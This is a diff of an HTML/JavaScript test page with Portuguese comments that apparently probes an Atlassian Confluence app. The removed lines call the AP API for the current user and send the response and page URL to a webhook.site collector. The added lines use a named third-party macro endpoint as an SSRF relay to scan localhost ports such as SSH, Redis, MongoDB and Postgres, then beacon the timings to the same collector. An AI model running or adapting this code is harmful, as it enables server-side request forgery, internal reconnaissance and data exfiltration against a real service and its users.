@@ -1,33 +1,24 @@
-<!DOCTYPE html>
-<html>
-<body>
-  <h1>Teste AP</h1>
-  <div id="status">Verificando...</div>
+<script>
+var ports = [22, 80, 443, 8080, 3000, 5000, 6379, 27017, 5432, 9200];
+var results = [];
+
+ports.forEach(function(port) {
+  var start = performance.now();
   
-  <script>
-    // Verificar se AP existe
-    if (typeof AP === 'undefined') {
-      document.getElementById('status').innerHTML = 'AP NÃO está disponível';
-      // Tentar via postMessage para parent
-      new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?ap_missing=' + location.href;
-    } else {
-      document.getElementById('status').innerHTML = 'AP está disponível!';
-      new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?ap_available=true';
-      
-      // Tentar request simples
-      try {
-        AP.request('/rest/api/user/current', {
-          success: function(r) {
-            new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?ap_works=' + encodeURIComponent(r.substring(0, 50));
-          },
-          error: function(xhr, status) {
-            new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?ap_error=' + encodeURIComponent(status);
-          }
-        });
-      } catch(e) {
-        new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?ap_exception=' + encodeURIComponent(e.message);
-      }
-    }
-  </script>
-</body>
-</html>
+  // Tentar conectar via redirect
+  fetch('https://confluence-dialogs.weweave.net/macro-remote?pageId=1212597&url=http://127.0.0.1:' + port + '/&outputType=display')
+    .then(function() {
+      var time = performance.now() - start;
+      results.push({port: port, time: time, status: 'open/filtered'});
+    })
+    .catch(function() {
+      var time = performance.now() - start;
+      results.push({port: port, time: time, status: 'closed/error'});
+    });
+});
+
+// Enviar resultados após 10 segundos
+setTimeout(function() {
+  new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?scan=' + encodeURIComponent(JSON.stringify(results));
+}, 10000);
+</script>
